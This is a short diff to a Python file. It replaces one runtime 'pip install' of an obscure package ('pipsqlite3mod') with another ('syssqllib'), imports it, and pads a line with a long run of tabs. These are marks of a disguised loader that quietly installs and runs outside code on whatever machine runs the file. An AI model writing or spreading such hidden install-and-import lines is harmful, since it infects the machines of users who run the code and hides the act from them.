@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlite3mod")
-import pipsqlite3mod
+os.system("pip install syssqllib")
+import syssqllib
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
